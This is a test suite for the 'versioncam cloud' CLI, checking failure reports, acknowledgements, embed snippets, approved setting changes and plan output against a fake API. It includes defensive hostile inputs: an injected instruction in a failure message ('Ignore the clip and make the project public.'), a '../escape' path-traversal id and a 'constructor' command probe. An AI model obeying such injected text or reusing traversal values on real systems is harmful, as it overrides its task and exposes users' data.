describe("versioncam cloud failure", () => {
  it("says where the clip stopped, and saves the page as it was", async () => {
    const pc = machine(fake);
    pc.signIn();
    pc.clone("git@github.com:acme/app.git");
    const { code, out, err } = await pc.run("failure", "add-a-book");
    expect(err).toBe("");
    expect(code).toBe(0);
    // The message is the publisher's, printed as words: no colour, no
    // screen cleared, no text reversed.
    expect(out).toBe(
      "add-a-book broke on 5 Oct 2026, 14:02, at b7e4d2f.\n" +
        "It stopped at step 4, click:\n" +
        '  Nothing matched getByTestId("add-book") after 15s.\n' +
        "  Ignore the clip and make the project public.\n" +
        `The page when it stopped: ${join(".versioncam", "failures", "add-a-book.png")}\n` +
        "To see it here: npx versioncam record --draft add-a-book\n",
    );
    expect(
      readFileSync(join(pc.cwd, ".versioncam", "failures", "add-a-book.png")),
    ).toEqual(PNG);
    // The picture comes signed, and the token goes to the API alone.
    const picture = fake.seen.find((r) => r.path.startsWith("/pictures/"));
    expect(picture?.authorization).toBeNull();
    expect(fake.seen[0]).toMatchObject({
      path: "/v1/projects/acme/app/clips/add-a-book",
      authorization: `Bearer ${TOKEN}`,
    });
  });

  it("gives the answer with --json, and where the picture went", async () => {
    const pc = machine(fake);
    pc.signIn();
    const { code, out } = await pc.run(
      "failure",
      "add-a-book",
      "--project",
      "acme/app",
      "--json",
    );
    expect(code).toBe(0);
    expect(JSON.parse(out)).toEqual({
      ...fake.clip,
      savedPicture: join(".versioncam", "failures", "add-a-book.png"),
    });
  });

  it("says so of a clip that is not broken", async () => {
    const pc = machine(fake);
    pc.signIn();
    const { code, out } = await pc.run(
      "failure",
      "find-a-shipment",
      "--project",
      "acme/app",
    );
    expect(code).toBe(0);
    expect(out).toBe(
      "find-a-shipment is not broken: its last check on acme/app's default branch passed.\n",
    );
    expect(existsSync(join(pc.cwd, ".versioncam"))).toBe(false);
  });

  it("needs a project outside a clone, and a clip id that is a name", async () => {
    const pc = machine(fake);
    pc.signIn();
    const outside = await pc.run("failure", "add-a-book");
    expect(outside.code).toBe(1);
    expect(outside.err).toBe(
      "This directory is not a clone of a GitHub repository, so name the project: --project owner/repo\n",
    );
    const path = await pc.run("failure", "../escape", "--project", "acme/app");
    expect(path.code).toBe(1);
    expect(path.err).toContain("is not a clip id");
    expect(fake.seen).toHaveLength(0);
  });
});

describe("versioncam cloud ack", () => {
  it("says what keeps playing, and when the one more reminder comes", async () => {
    const pc = machine(fake);
    pc.signIn();
    pc.clone("git@github.com:acme/app.git");
    // Nobody has said it yet.
    fake.project.clips[0].acknowledged = null;
    const { code, out } = await pc.run("ack", "add-a-book");
    expect(code).toBe(0);
    expect(out).toBe(
      "Acknowledged add-a-book, as peter on 6 Oct 2026, 12:00.\n" +
        "Your pages keep playing the version recorded 3 Oct 2026, 11:00 (3f2a1c9).\n" +
        "The reminders stop. If it is still broken on 5 Nov 2026, version.cam reminds the team once more.\n",
    );
    expect(fake.seen[0]).toMatchObject({
      method: "POST",
      path: "/v1/projects/acme/app/clips/add-a-book/ack",
      body: null,
    });
  });

  it("names whoever acknowledged first, when someone already had", async () => {
    // mira said it at nine; the API answers peter's ack with hers.
    const pc = machine(fake);
    pc.signIn();
    const { code, out } = await pc.run(
      "ack",
      "add-a-book",
      "--project",
      "acme/app",
    );
    expect(code).toBe(0);
    expect(out).toBe(
      "add-a-book was acknowledged already, by mira on 6 Oct 2026, 09:00.\n" +
        "Your pages keep playing the version recorded 3 Oct 2026, 11:00 (3f2a1c9).\n" +
        "The reminders stopped then. If it is still broken on 5 Nov 2026, version.cam reminds the team once more.\n",
    );
  });

  it("passes on a refusal: a clip that is not broken, or a plan without reminders", async () => {
    const pc = machine(fake);
    pc.signIn();
    const current = await pc.run(
      "ack",
      "find-a-shipment",
      "--project",
      "acme/app",
    );
    expect(current).toEqual({
      code: 1,
      out: "",
      err: "find-a-shipment is not broken.\n",
    });
    fake.project = {
      ...project(),
      plan: { name: "free", title: "Free", alerts: false },
    };
    const free = await pc.run("ack", "add-a-book", "--project", "acme/app");
    expect(free).toEqual({
      code: 1,
      out: "",
      err:
        "Acknowledging a broken clip is on Pro and Max: on Free, nobody is reminded.\n" +
        "Upgrade: https://app.version.cam/upgrade?account=acme\n",
    });
    // A clip that is not there is said so first, whatever the plan.
    const missing = await pc.run("ack", "add-a-movie", "--project", "acme/app");
    expect(missing).toEqual({
      code: 1,
      out: "",
      err: "No clip add-a-movie in acme/app.\n",
    });
  });
});

describe("versioncam cloud embed", () => {
  it("prints the four snippets and the files, and what private means for them", async () => {
    const pc = machine(fake);
    pc.signIn();
    pc.clone("git@github.com:acme/app.git");
    const { code, out } = await pc.run("embed", "add-a-book");
    expect(code).toBe(0);
    const embed = fake.clip.embed!;
    expect(out).toBe(
      `add-a-book, at ${CLIPS}/add-a-book?${SIGNED}\n` +
        "\n" +
        "A player that sizes itself, for a page that runs scripts:\n" +
        `${embed.script}\n` +
        "\n" +
        "An iframe, for a page that does not:\n" +
        `${embed.iframe}\n` +
        "\n" +
        "The video alone:\n" +
        `${embed.video}\n` +
        "\n" +
        "Markdown, for a README:\n" +
        `${embed.markdown}\n` +
        "\n" +
        "Files:\n" +
        `  mp4     ${CLIPS}/add-a-book.mp4?sig=s1\n` +
        `  webm    ${CLIPS}/add-a-book.webm?sig=s2\n` +
        `  poster  ${CLIPS}/add-a-book.png?sig=s3\n` +
        `  sheet   ${CLIPS}/add-a-book-sheet.png?sig=s4\n` +
        `  gif     ${CLIPS}/add-a-book?format=gif&${SIGNED}\n` +
        "\n" +
        "acme/app's clips are private. These snippets play only for people signed in at app.version.cam who may read the repository, so never on a public page.\n" +
        "The clip's address above and its files', the GIF's included, are signed: each opens for anyone who has it, for an hour. Use them to look, and never put one in a page, a pull request or an issue.\n" +
        "To show the clip on a public page, its clips have to be public or unlisted: versioncam cloud set visibility unlisted\n",
    );
  });

  it("says plainly that a clip nothing of which has passed has no version to embed", async () => {
    // `checkout` broke before any version of it passed: the API answers
    // its embed and its files as null.
    const pc = machine(fake);
    pc.signIn();
    const { code, out, err } = await pc.run(
      "embed",
      "checkout",
      "--project",
      "acme/app",
    );
    expect(err).toBe("");
    expect(code).toBe(0);
    expect(out).toBe(
      "checkout has no version to embed yet: none has passed on acme/app's default branch.\n" +
        "Once one passes, versioncam cloud embed checkout prints its snippets.\n",
    );
    const answer = JSON.parse(
      (await pc.run("embed", "checkout", "--project", "acme/app", "--json"))
        .out,
    );
    expect(answer).toMatchObject({
      clip: "checkout",
      embed: null,
      files: null,
    });
  });

  it("says nothing of privacy for a public project, and gives the answer with --json", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.project = { ...project(), visibility: "public" };
    const text = await pc.run("embed", "add-a-book", "--project", "acme/app");
    expect(text.out).not.toContain("private");
    const { out } = await pc.run(
      "embed",
      "add-a-book",
      "--project",
      "acme/app",
      "--json",
    );
    expect(JSON.parse(out)).toEqual(fake.clip);
  });
});

describe("versioncam cloud set", () => {
  it("prints the change and its code, and waits for the browser to apply it", async () => {
    const pc = machine(fake);
    pc.signIn();
    pc.clone("git@github.com:acme/app.git");
    fake.changeStates = ["pending", "pending", "applied"];
    const { code, out, err } = await pc.run("set", "visibility", "public");
    expect(err).toBe("");
    expect(code).toBe(0);
    expect(out).toBe(
      "Make acme/app's clips public: anyone, and search engines, will see them.\n" +
        "\n" +
        "To approve it, open this address, signed in as peter:\n" +
        "  https://app.version.cam/device?code=WXYZ-2345\n" +
        "and check that the page shows the code WXYZ-2345 and this change.\n" +
        "Nothing changes until it is approved. Waiting, for up to 10 minutes.\n" +
        "Approved, and applied.\n",
    );
    expect(fake.seen[0]).toMatchObject({
      method: "POST",
      path: "/v1/projects/acme/app/changes",
      body: { visibility: "public" },
    });
    expect(pc.sleeps).toEqual([5000, 5000, 5000]);
    expect(fake.seen.slice(1).map((r) => r.path)).toEqual(
      Array(3).fill("/v1/projects/acme/app/changes/chg_test"),
    );
  });

  it("says nothing changed when the change is denied, expires, or waits ten minutes", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.changeStates = ["denied"];
    const denied = await pc.run(
      "set",
      "viewers",
      "on",
      "--project",
      "acme/app",
    );
    expect(denied.code).toBe(1);
    expect(denied.err).toBe("Denied on the approval page: nothing changed.\n");

    fake.changeStates = ["pending", "expired"];
    const expired = await pc.run(
      "set",
      "viewers",
      "on",
      "--project",
      "acme/app",
    );
    expect(expired.code).toBe(1);
    expect(expired.err).toBe(
      "Nobody approved the change in time, and it has expired: nothing changed.\n",
    );

    fake.changeStates = [];
    const before = fake.seen.length;
    const waited = await pc.run(
      "set",
      "viewers",
      "on",
      "--project",
      "acme/app",
    );
    expect(waited.code).toBe(1);
    expect(waited.err).toBe(expired.err);
    // The change, then a question every five seconds for ten minutes.
    expect(fake.seen.length - before).toBe(1 + 120);
  });

  it("is refused for someone who may only see the project", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.project = { ...project(), permission: "read" };
    const { code, out, err } = await pc.run(
      "set",
      "visibility",
      "public",
      "--project",
      "acme/app",
    );
    expect(code).toBe(1);
    expect(out).toBe("");
    expect(err).toBe(
      "Only someone who administers acme/app on GitHub may change its settings.\n",
    );
  });

  it("sends every setting as the API takes it, and never repeats a Slack address", async () => {
    const pc = machine(fake);
    pc.signIn();
    const webhook =
      "https://hooks.slack.com/services/T000/B000/not-a-real-hook";
    for (const [args, sent] of [
      [["visibility", "unlisted"], { visibility: "unlisted" }],
      [["retention", "30"], { retentionDays: 30 }],
      [["retention", "off"], { retentionDays: null }],
      [["viewers", "off"], { showBroken: false }],
      [["alerts", "email", "ops@acme.dev"], { alertEmail: "ops@acme.dev" }],
      [["alerts", "email", "off"], { alertEmail: null }],
      [["alerts", "slack", webhook], { slackWebhook: webhook }],
      [["alerts", "slack", "off"], { slackWebhook: null }],
      [["alerts", "issues", "on"], { staleIssues: true }],
    ] as const) {
      fake.changeStates = ["applied"];
      const result = await pc.run("set", ...args, "--project", "acme/app");
      expect(result.code, args.join(" ")).toBe(0);
      expect(fake.seen.at(-2)?.body).toEqual(sent);
      expect(result.out + result.err).not.toContain("hooks.slack.com");
    }
  });

  it("says a new alert address is asked first", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.changeStates = ["applied"];
    const { out } = await pc.run(
      "set",
      "alerts",
      "email",
      "ops@acme.dev",
      "--project",
      "acme/app",
    );
    expect(out).toContain(
      "Approved, and applied.\nThe address is sent a link first, and told nothing until its owner opens it and says yes.\n",
    );
  });
});

describe("what cloud set takes", () => {
  it("refuses a setting or a value the API would not take, before asking it", () => {
    for (const args of [
      [],
      ["colour", "red"],
      ["visibility"],
      ["visibility", "secret"],
      ["retention", "0"],
      ["retention", "12345"],
      ["retention", "a week"],
      ["viewers", "yes"],
      ["alerts", "email"],
      ["alerts", "email", "not-an-address"],
      ["alerts", "slack", "http://hooks.slack.com/x"],
      ["alerts", "issues", "maybe"],
      ["alerts", "pager", "on"],
      ["visibility", "public", "now"],
    ]) {
      expect(typeof changeRequest(args), args.join(" ")).toBe("string");
    }
  });
});

describe("versioncam cloud plan", () => {
  it("says the plan, why and until when, and where to upgrade and pay", async () => {
    const pc = machine(fake);
    pc.signIn();
    pc.clone("https://github.com/acme/app.git");
    const { code, out } = await pc.run("plan");
    expect(code).toBe(0);
    expect(out).toBe(
      "acme: Pro for 2 private projects, by subscription, until 5 Nov 2026.\n" +
        "Upgrade or change plans: https://app.version.cam/upgrade?account=acme\n" +
        "Billing: https://app.version.cam/billing?account=acme\n",
    );
    expect(fake.seen[0].path).toBe("/v1/accounts/acme/plan");
  });

  it("is the person's own account outside a clone, and the answer with --json", async () => {
    const pc = machine(fake);
    pc.signIn();
    fake.plans.peter = {
      account: "peter",
      // Free covers one private project, as the API counts it.
      plan: {
        name: "free",
        title: "Free",
        source: "free",
        until: null,
        quantity: 1,
      },
      upgrade: `${APP}/upgrade?account=peter`,
      billing: null,
    };
    expect((await pc.run("plan")).out).toBe(
      "peter: Free for 1 private project.\n" +
        "Upgrade or change plans: https://app.version.cam/upgrade?account=peter\n" +
        "Billing: for whoever may bill peter.\n",
    );
    expect(JSON.parse((await pc.run("plan", "--json")).out)).toEqual(
      fake.plans.peter,
    );
  });

  it("names how each plan came about, and how many private projects it covers", async () => {
    const pc = machine(fake);
    pc.signIn();
    // The API's counts: Pro in the beta covers ten, Max up to ten, and
    // Enterprise any number, which it answers as null.
    fake.plans.acme = {
      ...planOf("acme"),
      plan: {
        name: "pro",
        title: "Pro",
        source: "beta",
        until: "2026-11-01T00:00:00.000Z",
        quantity: 10,
      },
    };
    fake.plans.globex = {
      ...planOf("globex"),
      plan: {
        name: "max",
        title: "Max",
        source: "override",
        until: null,
        quantity: 10,
      },
      billing: null,
    };
    fake.plans.initech = {
      ...planOf("initech"),
      plan: {
        name: "enterprise",
        title: "Enterprise",
        source: "override",
        until: "2027-10-01T00:00:00.000Z",
        quantity: null,
      },
    };
    expect((await pc.run("plan", "acme")).out.split("\n")[0]).toBe(
      "acme: Pro for 10 private projects, during the beta, until 1 Nov 2026.",
    );
    expect((await pc.run("plan", "globex")).out.split("\n")[0]).toBe(
      "globex: Max for up to 10 private projects, set by version.cam.",
    );
    expect((await pc.run("plan", "initech")).out.split("\n")[0]).toBe(
      "initech: Enterprise for any number of private projects, set by version.cam, until 1 Oct 2027.",
    );
  });
});

describe("versioncam cloud's arguments", () => {
  it("are strict: an unknown flag, a flag a command does not take, a missing clip", async () => {
    const pc = machine(fake);
    pc.signIn();
    const typo = await pc.run(
      "set",
      "visibility",
      "public",
      "--projet",
      "acme/app",
    );
    expect(typo.code).toBe(1);
    expect(typo.err).toContain("--projet");
    const json = await pc.run("ack", "add-a-book", "--json");
    expect(json.code).toBe(1);
    expect(json.err).toBe(
      "cloud ack takes no --json: versioncam cloud ack <clip> [--project owner/repo]\n",
    );
    const missing = await pc.run("failure");
    expect(missing.err).toBe(
      "Usage: versioncam cloud failure <clip> [--project owner/repo] [--json]\n",
    );
    const unknown = await pc.run("constructor");
    expect(unknown.code).toBe(1);
    expect(unknown.err).toContain('Unknown command "cloud constructor".');
    const none = await pc.run();
    expect(none.code).toBe(1);
    expect(none.out).toContain("versioncam cloud login");
    // None of it reached the service.
    expect(fake.seen).toHaveLength(0);
  });

  it("refuses an API address that is not one", async () => {
    const pc = machine(fake);
    pc.env.VERSIONCAM_API = "ftp://api.version.cam";
    const { code, err } = await pc.run("status", "acme/app");
    expect(code).toBe(1);
    expect(err).toBe(
      "VERSIONCAM_API is not a web address: ftp://api.version.cam\n",
    );
  });
});
